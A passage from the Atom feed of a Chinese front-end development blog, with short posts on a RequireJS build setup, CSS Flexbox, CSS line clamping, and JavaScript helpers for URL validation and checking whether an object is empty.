class="name">ul</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">%</span> <span class="attr">_.each</span>(<span class="attr">people</span>, <span class="attr">function</span> (<span class="attr">job</span>, <span class="attr">name</span>) &#123; %&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">name</span> %&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>: <span class="tag">&lt;<span class="name">%=</span> <span class="attr">job</span> %&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">%</span> &#125;); %&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div></pre></td></tr></table></figure><p><img src="https://cms-assets.tutsplus.com/legacy-premium-tutorials/posts/11931/images/11931_c64d1e1d443dbd47e7a52e54986d197c.png" alt=""></p><h3 id="优化工具"><a href="#优化工具" class="headerlink" title="优化工具"></a>优化工具</h3><p><code>app.build.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(&#123;</div><div class="line">    appDir: <span class="string">"../"</span>,</div><div class="line">    baseUrl: <span class="string">"js"</span>,</div><div class="line">    dir: <span class="string">"../../sample-build"</span>,</div><div class="line">    optimizeCSS: <span class="string">"standard"</span>,</div><div class="line">    paths : &#123;</div><div class="line">        <span class="string">"underscore"</span> : <span class="string">"libs/underscore-min"</span></div><div class="line">    &#125;,</div><div class="line">    modules: [ &#123; <span class="attr">name</span>: <span class="string">"main"</span> &#125; ]</div><div class="line">&#125;)</div></pre></td></tr></table></figure><p><code>r.js</code> 默认优化配置，可以选择性改变</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">buildBaseConfig = &#123;</div><div class="line">    appDir: <span class="string">""</span>,</div><div class="line">    pragmas: &#123;&#125;,</div><div class="line">    paths: &#123;&#125;,</div><div class="line">    optimize: <span class="string">"uglify"</span>,</div><div class="line">    optimizeCss: <span class="string">"standard.keepLines"</span>,</div><div class="line">    inlineText: <span class="literal">true</span>,</div><div class="line">    isBuild: <span class="literal">true</span>,</div><div class="line">    optimizeAllPluginResources: <span class="literal">false</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>开始 build 优化</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">node /path/to/r.js -o app.build.js</div></pre></td></tr></table></figure><p>输出</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Optimizing (standard) CSS file: /Users/andrew/Sites/sample-build/css/custom.css</div><div class="line">Optimizing (standard) CSS file: /Users/andrew/Sites/sample-build/css/main.css</div><div class="line"></div><div class="line">Tracing dependencies <span class="keyword">for</span>: main</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/app.build.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/dom/events.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/libs/underscore-min.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/main.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/require.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/text.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/utils/array.js</div><div class="line"></div><div class="line">js/main.js</div><div class="line">----------------</div><div class="line">js/utils/array.js</div><div class="line">js/dom/events.js</div><div class="line">js/text.js</div><div class="line">text!templates/list.html</div><div class="line">js/libs/underscore-min.js</div><div class="line">js/main.js</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;摘录自：&lt;a href=&quot;https://code.tutsplus.com/tutorials/next-generation-javascript-with-amd-and-requirejs--net-21596&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Next Generation JavaScript with AMD and RequireJS&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;为了解决的问题&quot;&gt;&lt;a href=&quot;#为了解决的问题&quot; class=&quot;headerlink&quot; title=&quot;为了解决的问题&quot;&gt;&lt;/a&gt;为了解决的问题&lt;/h3&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;file1.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;file2.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;file3.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="AMD" scheme="http://youngdze.co/tags/AMD/"/>
    
      <category term="JavaScript" scheme="http://youngdze.co/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>CSS Flexbox</title>
    <link href="http://youngdze.co/2015/08/27/css-flexbox/"/>
    <id>http://youngdze.co/2015/08/27/css-flexbox/</id>
    <published>2015-08-27T08:36:20.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>有一个容器：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><p>设置容器如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.container</span> &#123;</div><div class="line">    <span class="attribute">display</span>: flex;</div><div class="line">    <span class="comment">/* 内部项目排列方向 */</span></div><div class="line">    <span class="attribute">flex-direction</span>: row | row-reverse | column | column-reverse;</div><div class="line">    <span class="comment">/* 是否换行和换行后反过来 */</span></div><div class="line">    <span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</div><div class="line">    <span class="comment">/* 速写法 */</span></div><div class="line">    flex-flow: &lt;&amp;#39;flex-direction&amp;#39;&gt; || &lt;&amp;#39;flex-wrap&amp;#39;&gt;;</div><div class="line">    <span class="comment">/* 整理版面 */</span></div><div class="line">    justify-content: flex-start | flex-end | center | space-between | space-around;</div><div class="line">    <span class="comment">/* 排列内部项目 */</span></div><div class="line">    align-items: flex-start | flex-end | center | stretch | baseline;</div><div class="line">    <span class="comment">/* 排列内容 */</span></div><div class="line">    align-content: flex-start | flex-end | center | stretch | space-between | space-around;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>设置内部项目如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.item</span> &#123;</div><div class="line">    <span class="comment">/* 排列顺序 */</span></div><div class="line">    <span class="attribute">order</span>: &lt;integer&gt;;</div><div class="line">    <span class="comment">/* 是否拉长 */</span></div><div class="line">    <span class="attribute">flex-grow</span>: &lt;number&gt;; <span class="comment">/* default 0 means no flex grow */</span></div><div class="line">    <span class="comment">/* 是否收缩 */</span></div><div class="line">    <span class="attribute">flex-shrink</span>: &lt;number&gt;; <span class="comment">/* default 0 means no flex shrink*/</span></div><div class="line">    <span class="comment">/* 项目长度 */</span></div><div class="line">    <span class="attribute">flex-basis</span>: &lt;length&gt; | auto; <span class="comment">/* default set to auto */</span></div><div class="line">    <span class="comment">/* 速写法 */</span></div><div class="line">    flex: none | [ &lt;&amp;#39;flex-grow&amp;#39;&gt; &lt;&amp;#39;flex-shrink&amp;#39;&gt;? || &lt;&amp;#39;flex-basis&amp;#39;&gt; ];</div><div class="line">    <span class="comment">/* 自排列 */</span></div><div class="line">    align-self: auto | flex-start | flex-end | center | baseline | stretch;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有一个容器：&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;container&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="CSS" scheme="http://youngdze.co/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>CSS 限制多行为省略号</title>
    <link href="http://youngdze.co/2015/08/27/css-line-clampin/"/>
    <id>http://youngdze.co/2015/08/27/css-line-clampin/</id>
    <published>2015-08-27T08:12:06.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>现在有如下 HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"module"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><p>设置多行限制为省略号如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.module</span> &#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">250px</span>;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.line-clamp</span> &#123;</div><div class="line">    <span class="attribute">display</span>: -webkit-box;</div><div class="line">    <span class="attribute">-webkit-line-clamp</span>: <span class="number">3</span>;</div><div class="line">    <span class="attribute">-webkit-box-orient</span>: vertical;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>设置宽度限制为省略号如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.module</span> &#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">250px</span>;</div><div class="line">    <span class="attribute">white-space</span>: nowrap;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">    <span class="attribute">text-overflow</span>: ellipsis;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;现在有如下 HTML：&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div 
      
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="CSS" scheme="http://youngdze.co/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 判断 URL</title>
    <link href="http://youngdze.co/2015/08/27/javascript-isurl/"/>
    <id>http://youngdze.co/2015/08/27/javascript-isurl/</id>
    <published>2015-08-27T06:36:27.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> URL_REGEXP = <span class="regexp">/^(http|ftp|https):\/\/[\w\-_]+(\.[\w\-_]+)+([\w\-\.,@?^=%&amp;:/~\+#]*[\w\-\@?^=%&amp;/~\+#])?$/</span>;</div><div class="line"><span class="keyword">var</span> url = <span class="string">"https://g.taobao.com/brand_detail.htm?navigator=all&amp;_input_charset=utf-8&amp;q=%E7%94%B7%E5%A3%AB%E8%A1%AC%E8%A1%AB%E8%8B%B1%E4%BC%A6%E6%AC%BE&amp;spm=5148.1292865.a31d2.2.NiXIQv"</span>;</div><div class="line">URL_REGEXP.test(url);    <span class="comment">// true</span></div></pre></td></tr></table></figure><a id="more"></a><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 来自 stackoverflow</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ValidURL</span>(<span class="params">str</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> pattern = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'^(https?:\/\/)?'</span>+ <span class="comment">// protocol</span></div><div class="line">    <span class="string">'((([a-z\d]([a-z\d-]*[a-z\d])*)\.)+[a-z]&#123;2,&#125;|'</span>+ <span class="comment">// domain name</span></div><div class="line">    <span class="string">'((\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;))'</span>+ <span class="comment">// OR ip (v4) address</span></div><div class="line">    <span class="string">'(\:\d+)?(\/[-a-z\d%_.~+]*)*'</span>+ <span class="comment">// port and path</span></div><div class="line">    <span class="string">'(\?[;&amp;a-z\d%_.~+=-]*)?'</span>+ <span class="comment">// query string</span></div><div class="line">    <span class="string">'(\#[-a-z\d_]*)?$'</span>,<span class="string">'i'</span>); <span class="comment">// fragment locater</span></div><div class="line">    <span class="keyword">if</span>(!pattern.test(str)) &#123;</div><div class="line">    alert(<span class="string">"Please enter a valid URL."</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>参考</p><ul><li><a href="http://stackoverflow.com/questions/5717093/check-if-a-javascript-string-is-an-url" target="_blank" rel="external">Check if a Javascript string is an url</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; URL_REGEXP = &lt;span class=&quot;regexp&quot;&gt;/^(http|ftp|https):\/\/[\w\-_]+(\.[\w\-_]+)+([\w\-\.,@?^=%&amp;amp;:/~\+#]*[\w\-\@?^=%&amp;amp;/~\+#])?$/&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; url = &lt;span class=&quot;string&quot;&gt;&quot;https://g.taobao.com/brand_detail.htm?navigator=all&amp;amp;_input_charset=utf-8&amp;amp;q=%E7%94%B7%E5%A3%AB%E8%A1%AC%E8%A1%AB%E8%8B%B1%E4%BC%A6%E6%AC%BE&amp;amp;spm=5148.1292865.a31d2.2.NiXIQv&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;URL_REGEXP.test(url);    &lt;span class=&quot;comment&quot;&gt;// true&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://youngdze.co/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 判断对象是否为空</title>
    <link href="http://youngdze.co/2015/08/05/javascript-is-empty/"/>
    <id>http://youngdze.co/2015/08/05/javascript-is-empty/</id>
    <published>2015-08-05T07:35:25.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>来自：<a href="http://stackoverflow.com/questions/4994201/is-object-empty" target="_blank" rel="external">Is object empty?</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Speed up calls to hasOwnProperty</span></div><div class="line"><span class="keyword">var</span> hasOwnProperty = <span class="built_in">Object</span>.prototype.hasOwnProperty;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">// null and undefined are "empty"</span></div><div class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line"></div><div class="line">    <span class="comment">// Assume if it has a length property with a non-zero value</span></div><div class="line">    <span class="comment">// that that property is correct.</span></div><div class="line">    <span class="keyword">if</span> (obj.length &gt; <span class="number">0</span>)    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">if</span> (obj.length === <span class="number">0</span>)  <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line"></div><div class="line">    <span class="comment">// Otherwise, does it have any properties of its own?</span></div><div class="line">    <span class="comment">// Note that this doesn't handle</span></div><div class="line">    <span class="comment">// toString and valueOf enumeration bugs in IE &lt; 9</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> obj) &#123;</div><div class="line">        <span class="keyword">if</span> (hasOwnProperty.call(obj, key)) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>underscore.js 对此有专门的函数判断，为 <code>_.isEmpty()</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;来自：&lt;a href=&quot;http://stackoverflow.com/questions/4994201/is-object-empty&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Is object empty?&lt;/a&gt;&lt;/p&gt;
&lt;figure c
      
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://youngdze.co/tags/JavaScript/"/>
    
  </entry>
  
</feed>
